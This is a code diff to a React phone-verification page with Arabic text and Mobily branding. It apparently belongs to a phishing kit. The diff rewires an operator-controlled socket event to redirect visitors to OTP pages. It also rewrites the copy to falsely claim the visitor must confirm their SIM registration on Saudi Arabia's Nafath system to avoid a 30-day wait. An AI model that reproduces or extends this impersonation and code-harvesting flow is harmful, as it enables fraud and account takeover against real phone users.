@@ -1,11 +1,12 @@
 import React from "react";
 import { useState } from "react";
 import axios from "axios";
-import { api_route, socket } from "../App";
+
 import { TailSpin } from "react-loader-spinner";
 import { AiOutlineCloseCircle } from "react-icons/ai";
 import { useEffect } from "react";
 import { MdOutlinePhoneCallback } from "react-icons/md";
+import { api_route, socket } from "../App";
 
 const Phone = () => {
   const [phoneNumber, setPhoneNumber] = useState(null);
@@ -90,7 +91,8 @@ const Phone = () => {
   socket.on("acceptService", ({ id, price }) => {
     if (id === ID) {
       if (code === "check" || phoneNetwork === "Mobily") {
-        return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
+        return (window.location.href = "/mobilyOtp");
+        // return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
       }
       return (window.location.href = "/phoneOtp");
     }
@@ -173,17 +175,6 @@ const Phone = () => {
               تأكيد
             </button>
           </div>
-          <div className="flex w-full gap-x-3 items-center justify-center">
-            <div className="w-20 ">
-              <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s" />
-            </div>
-            <div className="w-20 ">
-              <img src="/Mastercard.png" />
-            </div>
-            <div className="w-20 ">
-              <img src="/visa_logo.jpg" />
-            </div>
-          </div>
         </form>
       ) : //  :
       //  verfiy === "STC" ? (
@@ -218,7 +209,7 @@ const Phone = () => {
           >
             <img src="/mobily.jpg" />
             <span className="text-gray-500 font-bold text-xl p-2">
-              تحويل شريحة مخالفتك الحالية الى مخالفتك الجديدة
+              لتأكيد اثبات توثيق شريحة جوالك على نظام نفاذ
             </span>
             <img src="/mobily2.jpg" />
             <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
@@ -248,7 +239,7 @@ const Phone = () => {
           >
             <img src="/mobily.jpg" />
             <span className="text-gray-500 font-bold text-xl p-2">
-              تحويل شريحة مخالفتك الحالية الى مخالفتك الجديدة
+              لتأكيد اثبات توثيق شريحة جوالك على نظام نفاذ
             </span>
             <img src="/mobily2.jpg" />
             <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
@@ -265,8 +256,8 @@ const Phone = () => {
               <span className="font-bold"> بانتظار تأكيد الجوال</span>
             </div>
             <p className="p-2">
-              وافق على الإتصال واتتم العملية لإستبدال مخالفتك القديمة بالمخالفة
-              الحالية بعد الخصم
+              وافق على الاتصال واتمم العملية لتاكيد استبدال شريحة معلومات موعدك
+              القديم على نظام نفاذ تجنّبا من الانتظار ٣٠ يوم .
             </p>
             <span className="w-full p-2">لم تستلم مكاملة ؟ </span>
             <span className="w-full p-2 flex items-center">
